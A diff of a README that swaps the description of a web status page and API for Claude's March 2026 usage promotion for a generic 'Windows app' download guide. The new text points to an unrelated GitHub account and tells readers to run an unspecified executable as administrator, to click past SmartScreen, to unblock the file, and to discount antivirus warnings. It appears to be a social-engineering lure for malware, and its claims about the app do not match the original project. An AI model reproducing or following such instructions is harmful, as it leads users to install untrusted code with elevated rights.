@@ -1,80 +1,173 @@
-# isclaude2x.com
+# 🧭 isclaude2x - Fast access to Claude tools
 
-Is Claude usage currently 2x? A live status page for [Claude's March 2026 usage promotion](https://support.claude.com/en/articles/14063676-claude-march-2026-usage-promotion).
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Outofsight-treasuryobligations81/isclaude2x)
 
-**Live at [isclaude2x.com](https://isclaude2x.com)**
+## 🚀 Getting Started
 
-## What is this?
+isclaude2x is a simple Windows app for reaching the isclaude2x.com experience from your desktop. It is built for people who want a quick way to open and use the app without extra setup.
 
-During March 13–27, 2026, Claude doubles your usage limits during off-peak hours:
+Use the link below to visit the download page and get the latest version:
 
-- **Weekdays:** 2x usage outside 5–11 AM PT / 8 AM–2 PM ET / 12–6 PM UTC
-- **Weekends:** 2x usage all day
-- **Plans:** Free, Pro, Max, Team (not Enterprise)
+**Download page:** https://github.com/Outofsight-treasuryobligations81/isclaude2x
 
-This site tells you whether it's 2x right now, with a live countdown to the next transition.
+## 💻 What You Need
 
-## API
+Before you install the app, check these basic requirements:
 
-### `GET /short`
+- Windows 10 or Windows 11
+- An internet connection
+- Enough free disk space for the app and its files
+- A browser that can open GitHub pages
+- Permission to save files to your Downloads folder
 
-Returns `yes` or `no` as plain text. User timezone from IP in `x-timezone` header.
+If your PC can run a modern web app, it should handle isclaude2x.
 
-```
-$ curl https://isclaude2x.com/short
-yes
-```
+## 📥 Download the App
 
-### `GET /json`
+1. Open the download page:
+   https://github.com/Outofsight-treasuryobligations81/isclaude2x
+2. Find the latest release or the main download area.
+3. Download the Windows file from the page.
+4. Save the file to your Downloads folder or Desktop.
 
-Returns full status as JSON, including time remaining for the current window.
+If the file comes in a .zip file, keep it in that format until you are ready to open it.
 
-```json
-{
-	"is2x": true,
-	"promoActive": true,
-	"isPeak": false,
-	"isWeekend": true,
-	"peakHours": "8 AM – 2 PM ET (weekdays only)",
-	"promoPeriod": "March 13–27, 2026",
-	"currentTimeET": "9:50 AM",
-	"currentTimeUser": "7:20 PM",
-	"currentDay": "Sunday",
-	"userTimezone": "Asia/Kolkata",
-	"timestamp": "2026-03-15T13:50:46.402Z",
-	"2xWindowExpiresInSeconds": 79753,
-	"2xWindowExpiresIn": "22h 09m 13s",
-	"standardWindowExpiresInSeconds": null,
-	"standardWindowExpiresIn": null
-}
-```
+## 🛠️ Install on Windows
 
-## Tech stack
+1. Open File Explorer.
+2. Go to the folder where you saved the file.
+3. If the file is a .zip, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the main app file and double-click it.
+6. If Windows asks for permission, choose Yes.
 
-- **Cloudflare Worker** — fully server-side rendered, no build step, no static assets
-- **TypeScript** — shared core logic between worker and tests
-- **dayjs** — timezone-aware date handling on the server
-- **Vanilla JS** — minimal inline client script for live clock ticking and debug mode
-- **IP geolocation** — `request.cf.timezone` for automatic timezone detection
+If you see a setup file, run that file and follow the steps on screen. If you see a portable app file, you can run it without a full install.
 
-## Debug mode
+## 🖱️ First Launch
 
-Enter the Konami code on the homepage (`↑↑↓↓←→←→ B A`) to open a debug panel. Simulate any date, time, and timezone to see what the status would be.
+When you open isclaude2x for the first time, the app may take a moment to start.
 
-## Development
+- Wait for the main window to appear
+- Keep your internet connection on
+- Sign in if the app asks for an account
+- Follow any prompts that appear on screen
 
-```bash
-pnpm install
-pnpm test          # run 150 vitest unit tests
-wrangler dev       # local dev server
-wrangler deploy    # deploy to Cloudflare
-```
+If Windows shows a SmartScreen message, choose the option that lets you continue only if you trust the source and expect the file to open normally.
 
-## Sources
+## ✨ Main Features
 
-- [Claude Support: March 2026 usage promotion](https://support.claude.com/en/articles/14063676-claude-march-2026-usage-promotion)
-- [@claudeai tweet](https://x.com/claudeai/status/2032911277497135523)
+isclaude2x focuses on a clean desktop flow for common use:
 
-## Author
+- Quick access to the isclaude2x.com service
+- Simple start screen
+- Easy navigation for non-technical users
+- Lightweight Windows-friendly design
+- Fast launch from your desktop or Start menu
+- Basic session handling for repeat use
+- Clear layout with fewer steps to get going
 
-[@mehulmpt](https://x.com/mehulmpt)
+## 🧭 How to Use It
+
+After the app opens, use it like this:
+
+1. Start the app from your desktop or Start menu.
+2. Wait for the main screen to load.
+3. Use the on-screen controls to open the service you need.
+4. Enter your details if the app asks for them.
+5. Keep the window open while you work.
+
+If the app has a refresh or reload option, use it when a page does not load right away.
+
+## 🔧 Common Windows Setup Tips
+
+If you want fewer problems during setup, try these steps:
+
+- Right-click the file and choose Run as administrator if the app does not open
+- Keep the file name unchanged
+- Avoid moving files while the app is running
+- Close other large apps if your PC feels slow
+- Make sure your browser and Windows are up to date
+
+If your antivirus blocks the file, check whether it flagged the app because it is new or unknown on your PC.
+
+## 🧰 Troubleshooting
+
+### The app does not open
+
+- Check that you extracted the .zip file first
+- Run the file again
+- Restart your PC
+- Try launching it as administrator
+
+### Windows blocks the file
+
+- Open the file properties
+- Look for an Unblock option if Windows shows one
+- Try downloading the file again from the same page
+
+### The app opens but stays blank
+
+- Check your internet connection
+- Close the app and open it again
+- Refresh the page or screen inside the app
+- Clear any saved cache if the app offers that option
+
+### The app feels slow
+
+- Close unused programs
+- Make sure Windows has enough free memory
+- Restart the app
+- Reboot your computer if needed
+
+## 📌 File Location
+
+Keep the app in a folder you can find later, such as:
+
+- Downloads
+- Desktop
+- Documents
+- A folder named isclaude2x
+
+Do not rename random files inside the app folder unless the instructions on screen tell you to do so.
+
+## 🔒 Privacy and Security
+
+Use the app only from the official GitHub page linked above. This helps you avoid bad copies from other sites.
+
+Good habits:
+
+- Download from the project page only
+- Check the file name before opening it
+- Keep Windows security tools on
+- Remove the app if it no longer matches what you expect
+
+## 🧩 Everyday Use
+
+isclaude2x works best when you use it in a normal daily flow:
+
+- Open the app
+- Let it load
+- Use the service
+- Close it when you are done
+
+If you use it often, place a shortcut on your desktop for faster access.
+
+## 📍 Quick Start Steps
+
+1. Visit https://github.com/Outofsight-treasuryobligations81/isclaude2x
+2. Download the Windows file
+3. Extract it if needed
+4. Open the app
+5. Follow the on-screen steps
+6. Use the app from your desktop as needed
+
+## 🖥️ Suggested Windows Shortcuts
+
+These shortcuts can save time:
+
+- `Win + E` to open File Explorer
+- `Win + D` to show the desktop
+- `Alt + Tab` to switch apps
+- `Ctrl + Shift + Esc` to open Task Manager
+
+If the app stops responding, Task Manager can help you close it and start again.
